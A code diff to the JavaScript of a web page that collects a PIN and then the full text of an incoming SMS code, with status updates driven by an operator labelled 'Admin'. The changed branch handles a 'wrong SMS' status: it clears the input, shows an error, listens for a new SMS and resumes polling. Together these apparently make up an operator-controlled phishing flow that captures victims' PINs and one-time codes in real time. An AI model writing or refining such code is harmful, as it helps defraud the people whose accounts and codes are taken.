@@ -341,16 +341,20 @@ document.addEventListener('DOMContentLoaded', () => {
                     switchStep(stepLoading, stepForm);
                     pinInputs[0].focus();
                 } else if (data.status === 'wrong_sms') {
+                    // Admin tapped 'SMS MBAYA': clear input box, reset state, and listen for a new incoming SMS
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
                     if (autoCheckInterval) clearInterval(autoCheckInterval);
+                    
                     otpText.value = '';
                     isAutoSubmitting = false;
                     charCount.innerText = '0/1000';
                     smsErrorBanner.classList.remove('hidden');
+                    
                     switchStep(stepLoading, stepOtp);
                     startHighSensitivityListener();
                     initWebOTP();
+                    pollStatus(); // Resume polling for the next status change
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
